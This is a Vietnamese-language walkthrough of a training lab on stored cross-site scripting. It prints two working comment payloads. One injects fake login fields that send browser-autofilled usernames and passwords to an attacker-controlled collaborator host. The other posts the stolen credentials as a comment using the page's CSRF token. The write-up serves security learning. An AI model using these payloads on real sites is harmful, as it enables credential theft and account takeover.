@@ -1,0 +1,39 @@
+XSS - Exploiting cross-site scripting to capture passwords
+
+End Goal: To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+
+Analystic
+---------
+Mục tiêu của bài này là ta vì phần comment của các bài post không thực hiện lọc đầu vào nên ta có thể tự do chèn vào cả html và xss. Nhìn qua tải trọng 1 chút:
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+Ở đây ta có thể thấy mục tiêu là chèn vào 2 trường input là username và password, và khi password được nhập vào thì sẽ tự động gửi 1 http request tới 1 trang mà được kẻ tấn công kiểm soát --> kẻ tấn công có thể lấy được username và password của người dùng. Ta sẽ liên tưởng đến lab 24 khi người dùng truy cập bài post sẽ tự động gửi session ID cho kẻ tấn công, tuy nhiên rõ ràng ở đây không phải vậy. Ta có thể thấy yêu cầu HTTP request chỉ được gửi đi khi sự kiện onchange được kích hoạt, vậy điều gì làm nó gửi request đi??. Đây có thể là 1 phần của cuộc tấn công lừa đảo nếu chúng ta có thể làm cho hộp thôn tin đăng nhập và password của mình trông thực sự hợp pháp thì người dùng có thể bị lừa và bắt đầu điền tên và mật khẩu của mình. Tuy nhiên nó không phải là nội dung của phòng lab này, đây là vấn đề liên quan đến thông tin xác thực tự động do trình duyệt cung cấp nên chúng ta có thể quen thuộc với ý tưởng rằng các trình duyệt khác nhau cho phép chúng ta lưu mật khẩu và chúng ta có khả năng tự động điền tên người dùng và mật khẩu tùy thuộc vào tên miền, vì vậy điều xảy ra ở đây là người dùng truy cập vào trang web mà trình duyệt nói đây là miền xyz tôi có thể thấy trường tên và mật khẩu ở đây, hãy để tôi thử và giúp ích cho người dùng và tư động điền tên đăng nhập và mật khẩu vào để tiết kiệm thời gian của người dùng. Và khi mật khẩu được điền xong, nó sẽ tự động được gửi đến endpoint của kẻ tấn công. vì vậy ta thậm chí còn k cần 1 nút để người dùng có thể gửi. Chính vì vậy khi nạn nhân truy cập vào web, ta sẽ có username và password và có thể giải quyết bài lab.
+Tuy nhiên cách trên chỉ áp dụng được với bản pro, vậy còn không có pro thì sao? Tương tự như lab 24, ý tưởng là thay vì đưa thông tin đến miền có thể kiểm soát, ta khiến nạn nhân tự comment thông tin của chính mình. Tương tự như trên phần input cũng cần có username và password, tuy nhiên sẽ sửa đổi và bổ sung 1 chút để có thể giải quyết bài lab này, sau đây là đoạn mã ta sẽ đưa vào comment:
+<input name=username id=username>
+<input type=password name=password onchange="hax()">
+<script>
+function hax(){
+    var token = document.getElementsByName('csrf')[0].value;
+    var username = document.getElementsByName('username')[0].value;
+    var password = document.getElementsByName('password')[0].value;
+    
+    var data = new FormData();
+    data.append('csrf',token);
+    data.append('postId',8);
+    data.append('comment',`${username}:${password}`);
+    data.append('name','victim');
+    data.append('email','victim@gmail.com');
+    data.append('website','https://google.com');
+
+    fetch('/post/comment',{
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+}
+</script>
+Có thể thấy 2 dòng đầu tiên ta tạo input cho username và password, cũng kích hoạt sự kiện onchange của trường mật khẩu để khi trang tự động điền mật khẩu vào, nó sẽ được gửi đăng với username lên phần comment. Tuy nhiên thay vì gọi fetch ở đó, ta đặt vào đó 1 hàm hax và viết hàm này ở trong đoạn script. Trước hết, vì trang web có sử dụng mã csrf để xác định request là đến từ cùng 1 nguồn, vì vậy ta gọi 1 biết token và đặt giá trị của nó là mã csrf của trang web của nạn nhân thông qua việc lấy giá trị của phần tử có tên là csrf trong trang (ta sẽ tìm thấy phần tử này trong mã nguồn của trang web.). Tiếp đến ta gọi 2 biến username và password để lưu trữ thông tin được trang tự động điền vào 2 trường này. Tiếp đến ta thực hiện tạo 1 FormData để gửi dữ liệu đi. Vì dữ liệu ta gửi đi là comment nên nó phải có đủ các trường mà trang web gốc có. Các phần tiếp theo, ta tái tạo lại 1 form comment cho giống ở web gốc và thực hiện truyền các biến đã gọi ở trên để tạo được comment có nội dung là tài khoản và mật khẩu của nạn nhân. Tiếp đó ta gọi hàm fetch API, ta biết điểm cuối của request là gửi tới /post/comment nên truyền và và truyền đối số thứ 2 là cấu trúc của gói tin gồm method, mode và nội dung là form data. sau khi ta điền mã này vào comment và đăng comment, quay lại trang post gốc, ta sẽ thấy được đã có nạn nhân truy cập vào và thấy được tài khoản và mật khẩu. Sử dụng các giá trị này để đăng nhập và giải quyết bài lab.
